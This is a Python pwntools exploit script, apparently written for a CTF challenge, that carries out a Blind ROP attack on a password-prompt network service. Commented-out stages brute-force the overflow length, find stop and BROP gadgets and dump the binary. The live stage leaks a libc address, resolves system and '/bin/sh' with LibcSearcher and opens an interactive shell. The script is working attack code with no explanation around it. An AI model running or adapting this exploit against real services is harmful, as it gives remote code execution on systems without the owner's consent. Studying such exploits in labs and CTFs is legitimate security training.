#-*- coding:utf-8 –*-
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level='debug'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')
#log_level=['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
elfFileName = ""
libcFileName = ""
ip = "0.0.0.0"
port = 9999


'''step1 get the length

def getbufferflow_length():
	i = 1
	while True:
		try:
			io = remote(ip,port)
			io.recvuntil("WelCome my friend,Do you know password?\n")
			io.sendline(i*'a')
			output = io.recv()
			io.close()
			if not output.startswith('No password'):
				return i - 1
			else:
				i += 1
		except EOFError:
			io.close()
			return i - 1


length = getbufferflow_length()
print length
'''

'''step2 get the stop gadget

gadget_array = []
def get_stop_addr(length):
	addr = 0x400000
	
	while 1:
		try:
			sh = remote('127.0.0.1', 10001)
			sh.recvuntil('password?\n')
			payload = 'a' * length + p64(addr)
			sh.sendline(payload)
			recvstr = sh.recv()
			sh.close()
			if recvstr.startswith('WelCome my friend,Do you know password?'):
				gadget_array.append(addr)
				return gadget_array
			print 'one success addr: 0x%x' % (addr)
			addr += 1
		except Exception:
			addr += 1
			sh.close()
length = 72
stop_gadget = get_stop_addr(length)
for i in range(len(stop_gadget)):
	print 'one success addr: 0x%x' % (stop_gadget[i])
'''

'''step3 get the brop gadget libc_csu_init

def get_brop_gadget(length, stop_gadget, addr):
	try:
		sh = remote('127.0.0.1', 10001)
		sh.recvuntil('password?\n')
		payload = 'a' * length + p64(addr) + p64(0) * 6 + p64(
			stop_gadget) + p64(0) * 10
		sh.sendline(payload)
		content = sh.recv()
		sh.close()
		print content
		# stop gadget returns memory
		if not content.startswith('WelCome'):
			return False
		return True
	except Exception:
		sh.close()
		return False


def check_brop_gadget(length, addr):
	try:
		sh = remote('127.0.0.1', 10001)
		sh.recvuntil('password?\n')
		payload = 'a' * length + p64(addr) + 'a' * 8 * 10
		sh.sendline(payload)
		content = sh.recv()
		sh.close()
		return False
	except Exception:
		sh.close()
		return True
length = 72
stop_gadget = 0x4006b6
addr = 0x400740#this addr must be lower like 0x4006b6
while 1:
	print hex(addr)
	if get_brop_gadget(length, stop_gadget, addr):
		print 'possible brop gadget: 0x%x' % addr
		if check_brop_gadget(length, addr):
			print 'success brop gadget: 0x%x' % addr
			break
	addr += 1
'''
'''
#step4 get the puts plt
def get_puts_addr(length, rdi_ret, stop_gadget):
	addr = 0x400550
	while 1:
		print hex(addr)
		sh = remote('127.0.0.1', 10001)
		sh.recvuntil('password?\n')
		payload = 'A' * length + p64(rdi_ret) + p64(0x400000) + p64(
			addr) + p64(stop_gadget)
		sh.sendline(payload)
		try:
			content = sh.recv()
			if content.startswith('\x7fELF'):
				print 'find puts@plt addr: 0x%x' % addr
				return addr
			sh.close()
			addr += 1
		except Exception:
			sh.close()
			addr += 1
length = 72
stop_gadget = 0x4006b6
brop_gadget = 0x4007ba
rdi_ret = brop_gadget + 9
puts_plt = get_puts_addr(length,rdi_ret,stop_gadget)
'''
'''
#get the file and get the put_got

def leakfunction(length, rdi_ret, puts_plt, stop_gadget):
	addr = 0x400000
	result = ""
	while addr < 0x401000:
		print hex(addr)
		data = leak(length, rdi_ret, puts_plt, addr, stop_gadget)
		if data is None:
			continue
		else:
			result += data
			addr += len(data)
	with open('code', 'wb') as f:
		f.write(result)

def leak(length, rdi_ret, puts_plt, leak_addr, stop_gadget):
    sh = remote('127.0.0.1', 10001)
    payload = 'a' * length + p64(rdi_ret) + p64(leak_addr) + p64(
        puts_plt) + p64(stop_gadget)
    sh.recvuntil('password?\n')
    sh.sendline(payload)
    try:
        data = sh.recv()
        sh.close()
        try:
            data = data[:data.index("\nWelCome")]
        except Exception:
            data = data
        if data == "":
            data = '\x00'
        return data
    except Exception:
        sh.close()
        return None


length = 72
stop_gadget = 0x4006b6
brop_gadget = 0x4007ba
rdi_ret = brop_gadget + 9
puts_plt = 0x400555
leakfunction(length, rdi_ret, puts_plt, stop_gadget)
'''

length = 72
stop_gadget = 0x4006b6
brop_gadget = 0x4007ba
rdi_ret = brop_gadget + 9
puts_plt = 0x400555
puts_got = 0x601018
sh = remote('127.0.0.1', 10001)
sh.recvuntil('password?\n')
payload = 'a' * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(
    stop_gadget)
sh.sendline(payload)
data = sh.recvuntil('\nWelCome', drop=True)
puts_addr = u64(data.ljust(8, '\x00'))
libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
payload = 'a' * length + p64(rdi_ret) + p64(binsh_addr) + p64(
    system_addr) + p64(stop_gadget)
sh.sendline(payload)
sh.interactive()